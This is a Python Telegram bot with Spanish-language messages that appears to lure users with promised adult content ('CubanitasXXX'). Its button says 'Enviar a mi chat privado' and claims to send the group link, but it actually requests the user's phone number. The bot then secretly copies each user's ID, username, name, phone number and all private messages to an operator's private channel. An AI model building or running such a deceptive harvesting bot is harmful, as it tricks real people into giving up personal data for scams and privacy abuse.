import os
from telegram import (
    Update, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton, Chat
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters
)

# ========= Variables =========
TOKEN = os.getenv("TOKEN")
CANAL = int(os.getenv("CANAL", "0"))   # canal privado (ej: -1001234567890)
VIDEO = os.getenv("VIDEO", "").strip() # file_id o URL
# ==============================

# Diccionario en memoria: msg_id_en_canal -> chat_id_usuario
INDEX = {}

# ---------- Textos ----------
def saludo(u) -> str:
    return (
        f"𝐇𝐨𝐥𝐚 {u.full_name} 𝐞𝐬𝐭𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐥𝐮𝐠𝐚𝐫 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨.\n\n"
        f"𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 “𝐄𝐧𝐯𝐢𝐚𝐫 𝐚 𝐦𝐢 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨” 𝐩𝐚𝐫𝐚 𝐞𝐧𝐯𝐢𝐚𝐫𝐭𝐞 𝐞𝐥 𝐞𝐧𝐥𝐚𝐜𝐞 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐚 𝐭𝐮 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨."
    )

def post_contacto(u) -> str:
    return (
        f"𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞 {u.full_name}, 𝐫𝐞𝐜𝐮𝐞𝐫𝐝𝐚 𝐚𝐩𝐨𝐫𝐭𝐚𝐫 𝐭𝐮 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨 𝐞𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐨 "
        f"𝐩𝐚𝐫𝐚 𝐪𝐮𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐬𝐢𝐠𝐚 𝐜𝐫𝐞𝐜𝐢𝐞𝐧𝐝𝐨."
    )

# ---------- Botoneras ----------
def kb_contacto():
    btn = KeyboardButton("𝐄𝐧𝐯𝐢𝐚𝐫 𝐚 𝐦𝐢 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def kb_unirme():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("𝐔𝐧𝐢𝐫𝐦𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨", url="https://t.me/CubanitasXXX_bot")]
    ])

# ---------- Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user

    # Video + mensaje
    if VIDEO:
        try:
            await context.bot.send_video(chat_id=chat.id, video=VIDEO, caption=saludo(user))
        except:
            await context.bot.send_message(chat_id=chat.id, text=saludo(user))
    else:
        await context.bot.send_message(chat_id=chat.id, text=saludo(user))

    # Pedir contacto
    await update.message.reply_text("Para continuar, comparte tu número:", reply_markup=kb_contacto())

    # Copiar al canal
    header = (
        f"🆕 Usuario inició /start\n"
        f"• ID: {user.id}\n"
        f"• Username: @{user.username if user.username else '—'}\n"
        f"• Nombre: {user.full_name}"
    )
    m = await context.bot.send_message(CANAL, header)
    INDEX[m.message_id] = chat.id

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact

    await update.message.reply_text("✅ Número recibido.", reply_markup=ReplyKeyboardRemove())
    await update.message.reply_text(post_contacto(user), reply_markup=kb_unirme())

    # Copiar al canal
    m = await context.bot.send_message(CANAL, f"📱 {user.full_name} compartió su número: {contact.phone_number}")
    INDEX[m.message_id] = update.effective_chat.id

async def relay_private(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copia todo lo que mande el usuario al canal"""
    user = update.effective_user
    msg = update.effective_message

    header = f"📩 Mensaje de {user.full_name} (@{user.username or '—'}) ID:{user.id}"
    m = await context.bot.send_message(CANAL, header)
    INDEX[m.message_id] = update.effective_chat.id

    copied = await context.bot.copy_message(CANAL, update.effective_chat.id, msg.message_id, reply_to_message_id=m.message_id)
    INDEX[copied.message_id] = update.effective_chat.id

async def reply_from_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Si respondes con reply en el canal, el bot manda eso al usuario"""
    if not update.channel_post.reply_to_message:
        return
    canal_msg = update.channel_post
    key = canal_msg.reply_to_message.message_id
    if key not in INDEX:
        return
    user_chat_id = INDEX[key]

    # Reenviar al usuario
    await context.bot.copy_message(user_chat_id, CANAL, canal_msg.message_id)

# ---------- Main ----------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, on_contact))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE, relay_private))
    app.add_handler(MessageHandler(filters.ALL & filters.UpdateType.CHANNEL_POST, reply_from_channel))

    app.run_polling()

if __name__ == "__main__":
    if not TOKEN or not CANAL:
        raise RuntimeError("Faltan TOKEN o CANAL en variables de entorno")
    main()
